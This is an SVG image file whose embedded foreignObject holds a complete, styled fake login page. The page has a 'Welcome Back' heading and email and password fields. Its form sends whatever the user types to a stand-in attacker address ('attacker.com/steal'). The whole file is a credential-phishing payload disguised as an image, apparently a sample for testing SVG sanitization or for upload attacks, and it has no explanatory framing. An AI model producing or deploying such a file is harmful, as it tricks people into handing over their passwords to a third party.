<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="400" height="500">
  <foreignObject width="100%" height="100%">
    <body xmlns="http://www.w3.org/1999/xhtml" style="margin:0;">
      <div style="font-family: Arial, sans-serif; background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); padding: 40px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); height: 100%; box-sizing: border-box;">
        <style>
          .login-container { max-width: 320px; margin: 0 auto; }
          .logo { text-align: center; margin-bottom: 25px; }
          .input-group { margin-bottom: 20px; }
          label { display: block; margin-bottom: 8px; font-weight: 600; color: #4a5568; }
          input { width: 100%; padding: 12px; border: 1px solid #e2e8f0; border-radius: 6px; font-size: 14px; box-sizing: border-box; }
          button { width: 100%; padding: 14px; background: #4299e1; color: white; border: none; border-radius: 6px; font-weight: 600; cursor: pointer; }
          .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #718096; }
          a { color: #4299e1; text-decoration: none; }
        </style>

        <div class="login-container">
          <div class="logo">
            <h2 style="color: #2d3748;">Welcome Back</h2>
            <p style="color: #718096;">Please login to continue</p>
          </div>

          <form action="https://attacker.com/steal" method="POST" target="_blank">
            <div class="input-group">
              <label>Email</label>
              <input type="text" name="username" placeholder="Enter your email" required />
            </div>
            <div class="input-group">
              <label>Password</label>
              <input type="password" name="password" placeholder="••••••••" required />
            </div>
            <button type="submit">Sign In</button>
          </form>

          <div class="footer">
            <p>Don't have an account? <a href="#">Sign up</a></p>
            <p><a href="#">Forgot password?</a></p>
          </div>
        </div>
      </div>
    </body>
  </foreignObject>
</svg>
